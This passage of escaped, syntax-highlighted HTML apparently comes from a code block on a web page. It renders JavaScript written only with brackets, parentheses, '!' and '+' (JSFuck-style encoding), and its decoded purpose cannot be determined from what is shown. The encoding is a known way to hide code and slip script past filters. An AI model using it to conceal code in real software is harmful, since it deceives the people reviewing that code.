punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span 